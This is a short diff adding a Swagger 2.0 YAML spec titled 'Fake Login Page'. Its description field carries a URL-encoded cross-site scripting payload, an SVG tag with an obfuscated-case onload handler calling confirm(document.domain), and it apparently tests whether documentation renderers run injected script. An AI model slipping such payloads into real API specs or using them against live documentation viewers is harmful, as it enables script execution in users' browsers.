@@ -1,0 +1,13 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '
+        </h1>%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+       '
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
